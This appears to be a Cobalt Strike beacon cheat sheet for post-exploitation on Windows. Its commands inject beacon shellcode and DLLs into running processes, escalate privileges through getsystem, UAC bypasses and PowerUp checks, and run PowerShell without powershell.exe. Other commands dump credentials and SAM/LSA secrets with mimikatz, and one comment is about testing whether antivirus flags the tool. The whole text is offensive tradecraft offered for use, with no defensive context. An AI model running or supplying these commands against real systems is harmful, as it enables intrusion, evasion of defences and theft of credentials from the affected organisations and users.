
# inject beacon into living system process
ps
inject <pid>

#Spawn
#Open a process, inject beacon shellcode into it and execute
spawnto x64 C:\Windows\System32\gpupdate.exe
spawn

#Get system
getsystem #rarely works ...
#UAC bypasses
elevate ...  			# usually does not work


#invoke powershell
powershell whoami
#powershell import
powershell-import /tools/windows/PowerSploit/Privesc/PowerUp.ps1
powershell Invoke-AllChecks
powershell Invoke-AllChecks -HtmlReport
#invoke powerpick (powershell without powershell)
powerpick whoami 
powerpick Invoke-AllChecks
powerpick Invoke-AllChecks -HtmlReport


#Injection stuffs
#inject powerpick into remote process
psinject <pid> <arch> <cmd>
#Inject DLL into living process
dllinject <pid> C:\path_to.dll
#inject shellcode to living process
shinject <pid> /tools/.../shellcode.bin
#If you want to execute your PE file, you will have to compile it as position independant code first
#then do shinject
#OR compile your code as a BeaconObjectFile (BOF)

#Execute a local .net assembly
execute-assembly /tools/../letsbefriends.exe

#mimikatz
mimikatz standard::coffee # see if it gets catched by AV
mimikatz sekurlsa::logonpasswords # default when using mimikatz without args
mimikatz lsadump::sam
mimikatz lsadump::lsa

#you can do service hijacking to do UAC bypass and it should work
shell sc start "Service"


